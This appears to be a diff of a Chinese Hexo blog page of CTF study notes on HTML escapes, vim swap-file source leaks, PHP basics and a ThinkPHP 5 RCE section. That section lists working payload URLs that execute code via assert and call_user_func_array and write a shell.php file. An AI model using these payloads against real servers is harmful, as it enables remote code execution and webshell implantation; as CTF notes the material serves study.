@@ -260,61 +260,61 @@
       
         <p>记录CTF中的一些琐碎杂项备忘，方便查找。</p>
 <a id="more"></a>
-<h2 id="HTML">HTML</h2>
-<h3 id="HTML中的特殊转义字符">HTML中的特殊转义字符</h3>
+<h2 id="html">HTML</h2>
+<h3 id="html中的特殊转义字符">HTML中的特殊转义字符</h3>
 <table>
 <thead>
-<tr>
+<tr class="header">
 <th>字符</th>
 <th>十进制</th>
 <th>转义字符</th>
 </tr>
 </thead>
 <tbody>
-<tr>
-<td>&quot;</td>
+<tr class="odd">
+<td>"</td>
 <td><code>&amp;#34;</code></td>
 <td><code>&amp;quot;</code></td>
 </tr>
-<tr>
+<tr class="even">
 <td>&amp;</td>
 <td><code>&amp;#38;</code></td>
 <td><code>&amp;amp;</code></td>
 </tr>
-<tr>
+<tr class="odd">
 <td>&lt;</td>
 <td><code>&amp;#60;</code></td>
 <td><code>&amp;lt;</code></td>
 </tr>
-<tr>
+<tr class="even">
 <td>&gt;</td>
 <td><code>&amp;#62;</code></td>
 <td><code>&amp;gt;</code></td>
 </tr>
-<tr>
+<tr class="odd">
 <td>不断开空格(non-breaking space)</td>
 <td><code>&amp;#160;</code></td>
 <td><code>&amp;nbsp;</code></td>
 </tr>
-<tr>
+<tr class="even">
 <td>|</td>
 <td><code>&amp;#166;</code></td>
 <td><code>&amp;brvbar;</code></td>
 </tr>
 </tbody>
 </table>
-<h2 id="Linux">Linux</h2>
+<h2 id="linux">Linux</h2>
 <h3 id="vim">vim</h3>
-<h3 id="swp-swo-…-文件">.swp/.swo/… 文件</h3>
+<h3 id="swp.swo...-文件">.swp/.swo/... 文件</h3>
 <p>这些文件是vim创建的临时文件。一个文件在vim中打开之后会创建 .swp 文件。如果 .swp 文件已存在，则创建 .swo 文件，若 .swo 文件存在则创建 .swn 文件，以此类推。vim 关闭时这些文件将自动被删除，若vim崩溃或被杀死，则保留。有时可用作 CTF 中源码的来源。</p>
 <p>例如：一个叫 <code>abc.php</code> 的文件会产生一个名为 <code>.abc.php.swp</code> 的临时文件。注意文件最前面有一个小点。</p>
-<h2 id="PHP">PHP</h2>
-<h3 id="PHP基础">PHP基础</h3>
+<h2 id="php">PHP</h2>
+<h3 id="php基础">PHP基础</h3>
 <h4 id="的区别">-&gt; , =&gt; , :: 的区别</h4>
 <p><code>-&gt;</code> 是插入式解引用的符号，用法与C语言相似。<code>=&gt;</code> 在数组中常常出现，用来连接键值对。<code>::</code> 与C语言中的 <code>.</code> 类似，用于调用类的内部成员，或类之间的相互调用。</p>
 <h3 id="phps">.phps</h3>
 <p>服务器遇php文件会解析。此时若想要读源码要使用phps文件。源码泄露的来源。</p>
-<h3 id="thinkphp5-RCE">thinkphp5 RCE</h3>
+<h3 id="thinkphp5-rce">thinkphp5 RCE</h3>
 <p>5.1.x php版本&gt;5.5</p>
 <figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/index.php?s=index/think\request/input?data[]=phpinfo()&amp;filter=assert</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/index.php?s=index/think\app/invokefunction&amp;function=call<span class="emphasis">_user_</span>func_array&amp;vars[<span class="string">0</span>]=assert&amp;vars[<span class="string">1</span>][<span class="symbol"></span>]=phpinfo()</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/index.php?s=index/\think\template\driver\file/write?cacheFile=shell.php&amp;content=<span class="xml"><span class="php"><span class="meta">&lt;?php</span>%<span class="number">20</span>phpinfo();<span class="meta">?&gt;</span></span></span></span><br></pre></td></tr></table></figure>
 <p>5.0.x php版本&gt;=5.4</p>
@@ -441,7 +441,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#HTML"><span class="nav-number">1.</span> <span class="nav-text">HTML</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#HTML中的特殊转义字符"><span class="nav-number">1.1.</span> <span class="nav-text">HTML中的特殊转义字符</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Linux"><span class="nav-number">2.</span> <span class="nav-text">Linux</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#vim"><span class="nav-number">2.1.</span> <span class="nav-text">vim</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#swp-swo-…-文件"><span class="nav-number">2.2.</span> <span class="nav-text">.swp&#x2F;.swo&#x2F;… 文件</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PHP"><span class="nav-number">3.</span> <span class="nav-text">PHP</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#PHP基础"><span class="nav-number">3.1.</span> <span class="nav-text">PHP基础</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#的区别"><span class="nav-number">3.1.1.</span> <span class="nav-text">-&gt; , &#x3D;&gt; , :: 的区别</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#phps"><span class="nav-number">3.2.</span> <span class="nav-text">.phps</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#thinkphp5-RCE"><span class="nav-number">3.3.</span> <span class="nav-text">thinkphp5 RCE</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#配置错误"><span class="nav-number">4.</span> <span class="nav-text">配置错误</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#源码泄露"><span class="nav-number">4.1.</span> <span class="nav-text">源码泄露</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#常见的网站源码备份文件后缀"><span class="nav-number">4.1.1.</span> <span class="nav-text">常见的网站源码备份文件后缀</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#常见的网站源码备份文件名"><span class="nav-number">4.1.2.</span> <span class="nav-text">常见的网站源码备份文件名</span></a></li></ol></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#html"><span class="nav-number">1.</span> <span class="nav-text">HTML</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#html中的特殊转义字符"><span class="nav-number">1.1.</span> <span class="nav-text">HTML中的特殊转义字符</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#linux"><span class="nav-number">2.</span> <span class="nav-text">Linux</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#vim"><span class="nav-number">2.1.</span> <span class="nav-text">vim</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#swp.swo...-文件"><span class="nav-number">2.2.</span> <span class="nav-text">.swp&#x2F;.swo&#x2F;... 文件</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#php"><span class="nav-number">3.</span> <span class="nav-text">PHP</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#php基础"><span class="nav-number">3.1.</span> <span class="nav-text">PHP基础</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#的区别"><span class="nav-number">3.1.1.</span> <span class="nav-text">-&gt; , &#x3D;&gt; , :: 的区别</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#phps"><span class="nav-number">3.2.</span> <span class="nav-text">.phps</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#thinkphp5-rce"><span class="nav-number">3.3.</span> <span class="nav-text">thinkphp5 RCE</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#配置错误"><span class="nav-number">4.</span> <span class="nav-text">配置错误</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#源码泄露"><span class="nav-number">4.1.</span> <span class="nav-text">源码泄露</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#常见的网站源码备份文件后缀"><span class="nav-number">4.1.1.</span> <span class="nav-text">常见的网站源码备份文件后缀</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#常见的网站源码备份文件名"><span class="nav-number">4.1.2.</span> <span class="nav-text">常见的网站源码备份文件名</span></a></li></ol></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -515,13 +515,13 @@
       <i class="fa fa-chart-area"></i>
     </span>
       <span class="post-meta-item-text">站点总字数：</span>
-    <span title="站点总字数">91k</span>
+    <span title="站点总字数">94k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
       <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
-    <span title="站点阅读时长">1:23</span>
+    <span title="站点阅读时长">1:26</span>
 </div>
   <!--<div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
   </div>
@@ -581,6 +581,61 @@
 
 
   
+
+  
+      
+
+<script>
+  if (typeof MathJax === 'undefined') {
+    window.MathJax = {
+      loader: {
+        source: {
+          '[tex]/amsCd': '[tex]/amscd',
+          '[tex]/AMScd': '[tex]/amscd'
+        }
+      },
+      tex: {
+        inlineMath: {'[+]': [['$', '$']]},
+        tags: 'ams'
+      },
+      options: {
+        renderActions: {
+          findScript: [10, doc => {
+            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+              const display = !!node.type.match(/; *mode=display/);
+              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+              const text = document.createTextNode('');
+              node.parentNode.replaceChild(text, node);
+              math.start = {node: text, delim: '', n: 0};
+              math.end = {node: text, delim: '', n: 0};
+              doc.math.push(math);
+            });
+          }, '', false],
+          insertedScript: [200, () => {
+            document.querySelectorAll('mjx-container').forEach(node => {
+              let target = node.parentNode;
+              if (target.nodeName.toLowerCase() === 'li') {
+                target.parentNode.classList.add('has-jax');
+              }
+            });
+          }, '', false]
+        }
+      }
+    };
+    (function () {
+      var script = document.createElement('script');
+      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
+      script.defer = true;
+      document.head.appendChild(script);
+    })();
+  } else {
+    MathJax.startup.document.state(0);
+    MathJax.texReset();
+    MathJax.typeset();
+  }
+</script>
+
+    
 
   
 
